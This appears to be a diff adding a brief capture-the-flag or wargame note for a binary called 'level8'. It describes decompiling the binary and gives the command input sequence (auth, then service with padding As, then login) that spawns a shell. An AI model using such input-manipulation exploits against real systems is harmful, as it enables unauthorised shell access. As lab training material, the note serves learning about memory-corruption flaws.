@@ -1,0 +1,9 @@
+using retargetable to decompile the binary.
+we can see that it compares fgets result through different strings : "auth " "reset" "service" "login"
+if we do somth like 
+./level8
+->auth "AAAAAAAAAAAA"
+->service "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+->login
+
+a new shell is starting
